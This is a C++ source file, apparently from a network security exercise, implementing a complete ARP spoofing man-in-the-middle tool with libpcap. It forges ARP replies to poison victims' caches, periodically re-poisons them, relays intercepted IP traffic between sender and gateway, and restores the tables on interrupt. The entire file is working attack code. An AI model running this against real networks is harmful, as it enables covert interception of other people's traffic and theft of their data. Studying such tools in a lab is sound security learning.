#include "arp-spoof.h"

void MakeEthArpPkt(EthArpPacket* lp_arp_pkt, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip , Mac arp_tmac , Ip arp_tip, int type){
    // arp packet for arp request
    // eth_dmac : broadcast
    lp_arp_pkt->eth_.dmac_ = eth_dmac;
    lp_arp_pkt->eth_.smac_ = eth_smac;
    lp_arp_pkt->eth_.type_ = htons(EthHdr::Arp);
    
	lp_arp_pkt->arp_.hrd_ = htons(ArpHdr::ETHER);
	lp_arp_pkt->arp_.pro_ = htons(EthHdr::Ip4);
	lp_arp_pkt->arp_.hln_ = Mac::SIZE;
	lp_arp_pkt->arp_.pln_ = Ip::SIZE;

    // arp request / reply
	if(type==ARP_REP_TYPE) lp_arp_pkt->arp_.op_ = htons(ArpHdr::Reply);
	else if(type==ARP_REQ_TYPE) lp_arp_pkt->arp_.op_ = htons(ArpHdr::Request);
    else {
        fprintf(stderr, "Wrong Arp type on MakeEthArpPkt\n");
        exit(-1);
    }

	lp_arp_pkt->arp_.smac_ = arp_smac;
	lp_arp_pkt->arp_.sip_ = htonl(arp_sip); // why only myIp doesn't work?
    // reply dmac
	lp_arp_pkt->arp_.tmac_ = arp_tmac;
	lp_arp_pkt->arp_.tip_ = htonl(arp_tip); // why only myIp doesn't work?
    return ;
}

Mac GetMyMac(char* dev){
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_ifrn.ifrn_name, dev);

	if(ioctl(fd, SIOCGIFHWADDR, &s) != 0) {
		perror("[!] ERROR on ioctl\n");
		exit(-1);
	}
	
	Mac mac = Mac( (uint8_t *) s.ifr_hwaddr.sa_data);
	return mac;
}

Ip GetMyIp(char* dev){
	struct ifreq ifr; 
	char ipstr[40]; 
	int s; 
	s = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP); 
	strncpy(ifr.ifr_name, dev, IFNAMSIZ); 

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0){
		perror("[!] ERROR on ioctl\n");
		exit(-1);
	}
    
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
	return Ip(ipstr);
	
}

Mac GetMacfromIp(pcap_t* handle, Ip tip){
    static Mac tmac; // why static Mac tmac = Mac::nullMac() doesn't work?
    tmac = Mac::nullMac(); 
    
    EthArpPacket arp_pkt;

    // logging
    // std::cout << "My        Mac :" << std::string(myMac) << "\n";
    // std::cout << "My        IP  :" << std::string(myIp) << "\n";
    
    // arp packet for arp request
    // eth: myMac -> broadcast
    // arp: myMac, myIp -> unknown mac, tip
    // arp request
    MakeEthArpPkt(&arp_pkt, myMac, Mac("FF:FF:FF:FF:FF:FF"),
                    myMac, myIp, Mac("00:00:00:00:00:00"), tip, ARP_REQ_TYPE);
    
    std::thread t1([](pcap_t* handle, EthArpPacket* lparp_pkt){
        int cnt = 0;
        while (tmac.isNull())
        {
            // send arp packet
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(lparp_pkt), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
            
            if (++cnt == 5){
                fprintf(stderr, "Cannot get target mac address (at sendpacket)\n");
                exit(-1);
            }
        }
    }, handle, &arp_pkt);
    
    
    std::thread t2([](pcap_t* handle, Ip tip){
        // receive packet
        while (true){
            pcap_pkthdr* header;
            const u_char* recv_packet;
            
            int res = pcap_next_ex(handle, &header, &recv_packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            
            // if receive packet is 
            // 1. ARP packet
            // 2. Reply
            // 3. source ip == tip
            EthArpPacket* _recv_packet = (EthArpPacket*) recv_packet;
            if (_recv_packet->eth_.type() == EthHdr::Arp){
                if (_recv_packet->arp_.op() == ArpHdr::Reply && _recv_packet->arp_.sip() == tip){
                    tmac = _recv_packet->arp_.smac();
                    break;
                }
            }
        }

    }, handle, tip);
    
    t1.join();
    t2.join();
    
    return tmac;
}


bool SendArpInfectPkt(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, int type){
    EthArpPacket arp_pkt;

    // arp infection packet type ** Reply **
    // ethernet : my_mac -> sender_mac
    // arp : (my_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is me! (my_mac)
    if(type == ARP_REP_TYPE) MakeEthArpPkt(&arp_pkt, myMac, sender_mac, myMac, target_ip, sender_mac, sender_ip, ARP_REP_TYPE);

    // arp infection packet type ** Request **
    // ethernet : my_mac -> sender_mac
    // arp : (my_mac, target_ip) -> (unknown, sender_ip) : target_ip is me(my_mac) and who is sender_ip? 
    else if (type == ARP_REQ_TYPE) MakeEthArpPkt(&arp_pkt, myMac, sender_mac, myMac, target_ip, Mac("00:00:00:00:00:00"), sender_ip, ARP_REQ_TYPE);

    // send arp packet
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return true;
}


void PeriodicInfection(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(20));

        for (auto& ip2ip : Send2Tar)
            SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
    } 
}

bool IpPacketRelay(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
    
    static std::queue<std::pair<Ip, Ip>> Arp_queue;

    std::thread t1([](pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
        while (true)
        {
            pcap_pkthdr* header;
            const u_char* recv_packet; // Too many Stack Memory?
            
            int res = pcap_next_ex(handle, &header, &recv_packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            // if receive packet is 
            // 0. ip packet
            // 1. from sender
            // 2. to gateway
            EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
            if (_recv_packet->eth_.type() == EthHdr::Ip4 && _recv_packet->eth_.dmac() != Mac("FF:FF:FF:FF:FF:FF")){
                for(auto& ip2ip : Send2Tar)
                {
                    if (_recv_packet->eth_.smac() == ArpTable[ip2ip.first] && _recv_packet->ip_.dip !=  htonl(myIp) ){
                        
                        _recv_packet->eth_.smac_ = myMac;
                        _recv_packet->eth_.dmac_ = ArpTable[ip2ip.second];

                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
                        if (res != 0) {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        break;
                    }
                }                
            }

            // if receive packet is
            // 0. arp packet
            // 1. request from sender
            // 2. to target_ip
            EthArpPacket* __recv_packet = (EthArpPacket*) recv_packet;
            if (__recv_packet->eth_.type() == EthHdr::Arp){
                for(auto& ip2ip : Send2Tar)
                {
                    if(__recv_packet->arp_.sip() == ip2ip.first && __recv_packet->arp_.tip() == ip2ip.second){
                        Arp_queue.push( ip2ip );
                        Arp_queue.pop();
                        SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
                    }
                }          
            }   
        }

    }, handle, Send2Tar, ArpTable);
    /*
    std::thread t2([](){
        while (true)
        {
            if(Arp_queue.empty() == false){ // mutex? semaphore?
                SendArpInfectPkt( )
            } 
        }
    })
    */
    
    t1.join();
    //t2.join();

    return true;
}

void SigINTHandler(int sig){
    
    EthArpPacket arp_pkt;
    printf("\n");
    
    for (auto& ip2ip : Send2Tar)
    {
        // arp infection packet type ** Reply **
        // ethernet : my_mac -> sender_mac
        // arp : (target_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is target_mac!
        MakeEthArpPkt(&arp_pkt, myMac, ArpTable[ip2ip.first], ArpTable[ip2ip.second], ip2ip.second, ArpTable[ip2ip.first], ip2ip.first, ARP_REP_TYPE);

        // send arp packet
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    printf("\nARP-spoofing DONE!\n");
    exit(0);
}